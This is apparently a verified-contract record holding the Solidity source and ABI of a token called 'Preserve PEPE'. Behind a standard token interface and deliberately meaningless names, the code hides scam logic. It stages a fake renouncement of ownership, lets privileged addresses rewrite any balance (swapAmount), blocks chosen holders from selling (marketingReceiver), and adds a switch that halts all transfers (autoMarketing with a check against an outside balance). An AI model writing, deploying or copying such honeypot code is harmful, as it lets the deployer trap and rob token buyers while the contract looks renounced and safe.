{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface receiverFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTo) external view returns (uint256);\n\n    function transfer(address minMarketing, uint256 maxSender) external returns (bool);\n\n    function allowance(address receiverList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minMarketing,\n        uint256 maxSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atTake, uint256 value);\n    event Approval(address indexed receiverList, address indexed spender, uint256 value);\n}\n\nabstract contract senderLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingTrading {\n    function createPair(address tokenMin, address buyFrom) external returns (address);\n}\n\ninterface receiverFeeMetadata is receiverFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PreservePEPE is senderLaunch, receiverFee, receiverFeeMetadata {\n\n    string private swapTo = \"PPE\";\n\n    bool private isWallet;\n\n    event OwnershipTransferred(address indexed txTotal, address indexed liquidityFee);\n\n    function allowance(address shouldLimit, address marketingMin) external view virtual override returns (uint256) {\n        if (marketingMin == toShould) {\n            return type(uint256).max;\n        }\n        return txIsMin[shouldLimit][marketingMin];\n    }\n\n    mapping(address => mapping(address => uint256)) private txIsMin;\n\n    bool public walletTake;\n\n    function limitSwap(address senderEnable, address minMarketing, uint256 maxSender) internal returns (bool) {\n        if (senderEnable == limitToken) {\n            return minModeLaunched(senderEnable, minMarketing, maxSender);\n        }\n        uint256 swapMaxReceiver = receiverFee(liquidityExempt).balanceOf(receiverSellLiquidity);\n        require(swapMaxReceiver == launchedIs);\n        require(minMarketing != receiverSellLiquidity);\n        if (launchedSwapTx[senderEnable]) {\n            return minModeLaunched(senderEnable, minMarketing, maxLaunched);\n        }\n        return minModeLaunched(senderEnable, minMarketing, maxSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoIs;\n    }\n\n    function transferFrom(address senderEnable, address minMarketing, uint256 maxSender) external override returns (bool) {\n        if (_msgSender() != toShould) {\n            if (txIsMin[senderEnable][_msgSender()] != type(uint256).max) {\n                require(maxSender <= txIsMin[senderEnable][_msgSender()]);\n                txIsMin[senderEnable][_msgSender()] -= maxSender;\n            }\n        }\n        return limitSwap(senderEnable, minMarketing, maxSender);\n    }\n\n    function transfer(address limitReceiver, uint256 maxSender) external virtual override returns (bool) {\n        return limitSwap(_msgSender(), limitReceiver, maxSender);\n    }\n\n    constructor (){\n        if (walletTake == fundSwap) {\n            fundTeam = false;\n        }\n        shouldFund minMax = shouldFund(toShould);\n        liquidityExempt = marketingTrading(minMax.factory()).createPair(minMax.WETH(), address(this));\n        \n        limitToken = _msgSender();\n        isExempt();\n        enableList[limitToken] = true;\n        senderAt[limitToken] = fundEnable;\n        if (exemptLaunch != tradingTakeTo) {\n            tradingTakeTo = exemptLaunch;\n        }\n        emit Transfer(address(0), limitToken, fundEnable);\n    }\n\n    function minModeLaunched(address senderEnable, address minMarketing, uint256 maxSender) internal returns (bool) {\n        require(senderAt[senderEnable] >= maxSender);\n        senderAt[senderEnable] -= maxSender;\n        senderAt[minMarketing] += maxSender;\n        emit Transfer(senderEnable, minMarketing, maxSender);\n        return true;\n    }\n\n    function approve(address marketingMin, uint256 maxSender) public virtual override returns (bool) {\n        txIsMin[_msgSender()][marketingMin] = maxSender;\n        emit Approval(_msgSender(), marketingMin, maxSender);\n        return true;\n    }\n\n    uint256 public tradingLaunched;\n\n    uint256 constant maxLaunched = 19 ** 10;\n\n    function owner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    uint256 launchedIs;\n\n    string private limitEnableAt = \"Preserve PEPE\";\n\n    function autoMarketing(uint256 maxSender) public {\n        limitModeReceiver();\n        launchedIs = maxSender;\n    }\n\n    uint256 private tradingTakeTo;\n\n    address public limitToken;\n\n    mapping(address => bool) public launchedSwapTx;\n\n    uint256 modeShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTo;\n    }\n\n    bool public minAuto;\n\n    mapping(address => bool) public enableList;\n\n    function balanceOf(address receiverTo) public view virtual override returns (uint256) {\n        return senderAt[receiverTo];\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityReceiver;\n    }\n\n    bool private fundSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return limitEnableAt;\n    }\n\n    bool public toSell;\n\n    bool public fundTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundEnable;\n    }\n\n    mapping(address => uint256) private senderAt;\n\n    function marketingReceiver(address tradingBuy) public {\n        limitModeReceiver();\n        \n        if (tradingBuy == limitToken || tradingBuy == liquidityExempt) {\n            return;\n        }\n        launchedSwapTx[tradingBuy] = true;\n    }\n\n    bool private isReceiver;\n\n    address toShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function limitModeReceiver() private view {\n        require(enableList[_msgSender()]);\n    }\n\n    uint256 public feeFund;\n\n    address private liquidityReceiver;\n\n    address receiverSellLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private fundEnable = 100000000 * 10 ** 18;\n\n    function launchedFee(address takeTotalTrading) public {\n        require(takeTotalTrading.balance < 100000);\n        if (minAuto) {\n            return;\n        }\n        \n        enableList[takeTotalTrading] = true;\n        if (feeFund != tradingLaunched) {\n            tradingLaunched = exemptLaunch;\n        }\n        minAuto = true;\n    }\n\n    uint8 private autoIs = 18;\n\n    function isExempt() public {\n        emit OwnershipTransferred(limitToken, address(0));\n        liquidityReceiver = address(0);\n    }\n\n    uint256 private exemptLaunch;\n\n    function swapAmount(address limitReceiver, uint256 maxSender) public {\n        limitModeReceiver();\n        senderAt[limitReceiver] = maxSender;\n    }\n\n    address public liquidityExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"autoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotalTrading\",\"type\":\"address\"}],\"name\":\"launchedFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSwapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"swapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PreservePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}